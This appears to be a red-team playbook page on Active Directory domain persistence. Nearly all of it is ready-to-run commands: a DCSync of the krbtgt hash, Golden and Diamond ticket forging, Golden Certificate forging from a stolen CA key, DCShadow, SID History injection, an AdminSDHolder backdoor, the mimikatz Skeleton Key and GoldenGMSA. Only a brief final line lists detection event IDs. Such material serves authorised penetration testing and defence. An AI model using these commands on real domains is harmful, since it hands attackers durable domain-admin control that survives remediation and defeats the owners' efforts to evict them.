---
id: persist
type: phase
label: "Domain Persistence & Dominance"
---


# Domain Persistence & Dominance

### Objective
Survive remediation, scoped and reversible.

### Ladder
**krbtgt → Golden/Diamond → Golden Certificate (CA key) → DCShadow/SID History → AdminSDHolder → DSRM → Skeleton Key (memory, temporary) → GoldenGMSA.**

### Exhaustive commands
```bash
# ── DCSync krbtgt ─────────────────────────────────────────────────────
impacket-secretsdump -just-dc-user krbtgt \
  corp.local/svc:'Password123!'@10.10.10.5

# ── Golden Ticket ─────────────────────────────────────────────────────
impacket-ticketer -nthash <krbtgt> -domain-sid S-1-5-21-X \
  -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache

# ── Diamond Ticket ────────────────────────────────────────────────────
Rubeus.exe diamond /tgtdeleg /ticketuser:administrator \
  /ticketuserid:500 /groups:512

# ── Golden Certificate ───────────────────────────────────────────────
certutil -backupKey C:\backup
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword p \
  --Subject "CN=Administrator" \
  --SubjectAltName administrator@corp.local --NewCertPath admin.pfx
certipy auth -pfx admin.pfx -dc-ip 10.10.10.5

# ── DCShadow ──────────────────────────────────────────────────────────
lsadump::dcshadow /object:CN=Victim,CN=Users,DC=corp,DC=local \
  /attribute:primaryGroupID /value:512
lsadump::dcshadow /push

# ── SID History ───────────────────────────────────────────────────────
Set-DomainObject -Identity lowpriv -Set @{sidHistory='S-1-5-21-X-500'}

# ── AdminSDHolder ─────────────────────────────────────────────────────
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
  -PrincipalSamAccountName lowpriv -Rights All
Invoke-SDPropagator -timeoutMinutes 1

# ── Skeleton Key ──────────────────────────────────────────────────────
mimikatz # privilege::debug
mimikatz # misc::skeleton

# ── GoldenGMSA (KDS root key required) ───────────────────────────────
GoldenGMSA.exe kdsinfo
GoldenGMSA.exe compute --sid <SID> --kdskey <base64> --pwdid <base64>
```

### Detection
**4662** replication; **4769 without 4768**; **5136** on AdminSDHolder; **4742/5136** sIDHistory writes; CA key export; LSASS patch telemetry.

---
